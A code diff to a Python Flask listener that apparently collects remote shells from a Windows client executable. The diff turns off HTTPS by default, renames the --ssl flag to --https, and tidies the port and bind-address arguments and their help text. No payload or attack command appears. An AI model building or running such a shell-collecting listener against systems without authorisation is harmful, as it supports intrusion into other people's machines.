@@ -15,7 +15,7 @@ current_dir = ''
 
 DEFAULT_IP_BIND_ADDRESS = '0.0.0.0'
 DEFAULT_PORT = 443
-DEFAULT_SSL_FLAG = True
+DEFAULT_SSL_FLAG = False
 
 shells_filename = 'shells.txt'
 client_win32_executable_file = './dist/client86.exe'
@@ -119,7 +119,11 @@ def write_shell(shell_id, remote_addr):
 
 
 class FlaskThread():
-    def __init__(self, app, ip, ssl=False, port=80):
+    def __init__(self,
+                 app,
+                 ip,
+                 port=80,
+                 ssl=False):
         assert app
         self.app = app
         self.ip = ip
@@ -148,17 +152,21 @@ def get_arguments():
                         dest='ip',
                         required=False,
                         default=DEFAULT_IP_BIND_ADDRESS,
-                        help='IP address of the Flask server to bind to. Default is ' + DEFAULT_IP_BIND_ADDRESS)
+                        help='Specify an IP address the bind the listener to. '
+                             f'Default is {DEFAULT_IP_BIND_ADDRESS}')
     parser.add_argument('--port',
                         dest='port',
                         default=DEFAULT_PORT,
+                        type=int,
                         required=False,
-                        help='Port of the Flask application to bind to. Default is ' + str(DEFAULT_PORT))
-    parser.add_argument('--ssl',
+                        help='Specify a TCP port to bind the listener to. Default is ' + str(DEFAULT_PORT))
+    parser.add_argument('--https',
                         action='store_true',
                         default=DEFAULT_SSL_FLAG,
                         required=False,
-                        help='Switch on HTTPS or not. Default is ' + str(DEFAULT_SSL_FLAG))
+                        help='Specify if the HTTPS protocol should be used for the communication. '
+                             f'Default is {DEFAULT_SSL_FLAG}')
+
     options = parser.parse_args()
 
     return options
